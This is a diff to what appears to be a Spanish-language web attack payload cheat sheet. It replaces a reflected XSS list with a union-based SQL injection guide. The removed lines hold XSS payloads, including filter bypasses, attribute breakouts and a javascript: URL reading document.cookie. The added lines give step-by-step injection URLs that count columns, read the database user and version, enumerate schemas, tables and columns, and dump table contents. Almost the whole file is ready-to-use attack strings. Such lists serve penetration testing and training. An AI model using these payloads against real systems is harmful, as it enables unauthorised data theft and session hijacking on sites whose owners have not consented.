@@ -1,59 +1,56 @@
 # =========================================================
-# PAYLOADS XSS REFLEJADOS (Reflected XSS Payloads)
+# PAYLOADS SQLI BASADO EN UNIÓN (Union-Based SQLi)
 # =========================================================
-# Estos payloads dependen de que el input del usuario (típicamente de la URL) 
-# se muestre inmediatamente en la respuesta HTML sin sanitización.
+# Este ataque utiliza el operador UNION SELECT para adjuntar el resultado de una 
+# consulta SELECT adicional (maliciosa) al resultado de la consulta original.
+# Requisito clave: Ambas consultas deben tener el mismo número de columnas y tipos de datos compatibles.
 
-# 1. TESTEO BÁSICO DE FUNCIONALIDAD (Etiquetas comunes)
-# ----------------------------------------------------
+# 1. DETERMINAR EL NÚMERO DE COLUMNAS
+# -----------------------------------
+# Se debe usar la cláusula 'ORDER BY' o múltiples 'UNION SELECT NULL' para determinar 
+# cuántas columnas tiene la consulta original.
 
-# 1.1 Script básico
-# Detecta si se permite la etiqueta <script> y el handler alert()
-<script>alert('XSS')</script>
+# 1.1 Método ORDER BY
+# Ejemplo: Probar con 1, 2, 3, ... hasta que falle para encontrar el número exacto (N).
+# URL: ?id=1 ORDER BY N -- 
 
-# 1.2 Etiqueta de imagen con error (sin usar <script>)
-# Útil si <script> está en una lista negra. 
-# El browser intenta cargar una imagen 'x' y ejecuta el evento onerror.
-<img src=x onerror=alert(document.domain)>
+# 1.2 Método UNION SELECT NULL (Probar con N=1, 2, 3, ...)
+# URL: ?id=-1 UNION SELECT NULL, NULL, NULL -- 
+# Importante: Usar un ID negativo (-1) para garantizar que la consulta original no devuelva filas, 
+# forzando a que la respuesta HTTP muestre los resultados de la consulta UNION.
 
-# 1.3 Etiqueta SVG con evento onload
-# Alternativa a <img>. Requiere que la entrada se refleje como un elemento HTML.
-<svg onload=alert(1)>
+# 2. IDENTIFICAR COLUMNAS VULNERABLES (Donde se inyecta texto)
+# -----------------------------------------------------------
+# Después de encontrar N columnas, reemplaza un NULL por una cadena de texto o un dato relevante.
 
-# 1.4 Etiqueta de cuerpo con evento onload
-# Útil si el input puede controlar la etiqueta <body> (más raro).
-<body onload=alert(1)>
+# Ejemplo (Suponiendo N=3, y la 2da columna es la que se muestra en la web):
+# URL: ?id=-1 UNION SELECT NULL, 'VULN', NULL -- 
+# Resultado esperado: La palabra 'VULN' aparecerá en la página.
 
-# 2. BYPASS DE FILTROS COMUNES (Lista negra de palabras)
-# ----------------------------------------------------
+# 3. EXTRACCIÓN DE INFORMACIÓN CLAVE
+# -----------------------------------
+# Una vez que se identifica una columna vulnerable, se pueden usar funciones internas de la base de datos.
 
-# 2.1 Uso de mayúsculas/minúsculas para bypass de listas negras simples
-# Si el filtro no es 'case-insensitive'.
-<ImG sRc=x OnErRoR=aLeRt(1)>
+# 3.1 Obtener la Versión de la DB y el Nombre de Usuario Actual
+# * MySQL/MariaDB: user(), version()
+# URL: ?id=-1 UNION SELECT 1, user(), version() -- 
 
-# 2.2 Reemplazo de palabras clave (alert() -> confirm(), prompt())
-# Si 'alert' está prohibido.
-<script>confirm(document.domain)</script>
+# * PostgreSQL: current_user, version()
+# URL: ?id=-1 UNION SELECT 1, current_user, version() -- 
 
-# 2.3 Uso de entidades HTML (Unicode/Decimal)
-# Si el filtro bloquea el string 'script' directamente.
-# Ejemplo: <script> -> &#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
-&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+# 3.2 Listar las Bases de Datos (MySQL/MariaDB)
+# Requiere que la versión de MySQL sea 5.0 o superior (donde existe el schema 'information_schema').
+# URL: ?id=-1 UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata -- 
 
-# 3. CONTEXTO DE INYECCIÓN (Si el input está dentro de un atributo)
-# ----------------------------------------------------------------
+# 3.3 Listar las Tablas de una Base de Datos Específica (MySQL/MariaDB)
+# Reemplaza 'nombre_db' con la base de datos de interés (ej., 'banco_de_usuarios').
+# URL: ?id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='nombre_db' -- 
 
-# 3.1 Rompiendo atributos con comillas dobles
-# Contexto: <input type="text" value="[INPUT]">
-# Payload: "> <img src=x onerror=alert(1)>
-"> <img src=x onerror=alert(1)>
+# 3.4 Listar las Columnas de una Tabla Específica (MySQL/MariaDB)
+# Reemplaza 'nombre_tabla' con la tabla de interés (ej., 'usuarios').
+# URL: ?id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='nombre_tabla' -- 
 
-# 3.2 Rompiendo atributos con comillas simples
-# Contexto: <a href='[INPUT]'>link</a>
-# Payload: ' onclick=alert(1) a='
-' onclick=alert(1) a='
-
-# 3.3 Usando Javascript en el atributo href
-# Contexto: <a href="[INPUT]">link</a>
-# Payload: javascript:alert(document.cookie)
-javascript:alert(document.cookie)
+# 3.5 Extraer Datos de una Tabla (Dump)
+# Reemplaza 'columna1', 'columna2' y 'tabla_interes' con los valores reales.
+# URL: ?id=-1 UNION SELECT 1, group_concat(columna1, 0x3a, columna2), 3 FROM tabla_interes -- 
+# Nota: 0x3a es el separador ':' en hexadecimal, usado para concatenar valores en una sola columna.
